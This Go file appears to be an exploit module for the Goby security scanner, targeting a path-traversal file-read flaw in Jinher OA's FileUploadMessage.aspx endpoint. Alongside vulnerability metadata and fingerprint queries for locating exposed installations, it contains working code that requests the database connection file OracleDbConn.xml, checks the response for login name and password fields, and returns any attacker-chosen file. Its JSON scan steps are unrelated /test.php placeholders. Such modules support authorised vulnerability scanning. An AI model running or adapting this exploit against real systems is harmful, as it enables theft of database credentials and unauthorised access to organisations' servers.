package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA FileUploadMessage.aspx file filename parameter file reading vulnerability",
    "Description": "<p>Jinher OA is a collaborative management platform that provides enterprises with standard office automation.</p><p>There is a read vulnerability in the FileUploadMessage.aspx endpoint of Jinher OA. An attacker can download sensitive files of the system, such as database connection configuration files, by controlling the ?filename parameter.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"C6/WebResource.axd\" || body=\"js/PasswordNew.js\" || body=\"JHSoft.UI.Lib\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || body=\"JHSoft.MobileApp\" || banner=\"Path=/jc6\" || header=\"Path=/jc6\" || body=\"/jc6/platform/\" || title=\"金和协同管理平台\"",
    "GobyQuery": "body=\"C6/WebResource.axd\" || body=\"js/PasswordNew.js\" || body=\"JHSoft.UI.Lib\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || body=\"JHSoft.MobileApp\" || banner=\"Path=/jc6\" || header=\"Path=/jc6\" || body=\"/jc6/platform/\" || title=\"金和协同管理平台\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "金和 OA FileUploadMessage.aspx 文件 filename 参数文件读取漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和 OA 是为企业提供标准的办公自动化的一款协同管理平台。<br></p><p>金和 OA FileUploadMessage.aspx 端点存在读取漏洞，攻击者可通过控制 ?filename 参数下载系统的敏感文件，如数据库连接配置文件。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a><br></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jinhe OA FileUploadMessage.aspx file filename parameter file reading vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinher OA is a collaborative management platform that provides enterprises with standard office automation.</p><p>There is a read vulnerability in the FileUploadMessage.aspx endpoint of Jinher OA. An attacker can download sensitive files of the system, such as database connection configuration files, by controlling the ?filename parameter.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.jinher.com/\">http://www.jinher.com/</a><br></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-23",
    "PocId": "10859"
}`

	sendPayloadbacf03ae := func(u *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=" + url.QueryEscape(filePath))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayloadbacf03ae(u, `../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml`)
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "<DbLoginName>") && strings.Contains(rsp.Utf8Html, "<DbLoginPass>")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			rsp, err := sendPayloadbacf03ae(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Output = err.Error()
			} else if (strings.Contains(rsp.HeaderString.String(), "application/octet-stream") && strings.Contains(rsp.HeaderString.String(), "Content-Disposition: attachment;")) || (strings.Contains(rsp.Utf8Html, `文件不存在,文件名`) && strings.Contains(rsp.Utf8Html, filePath)) {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}
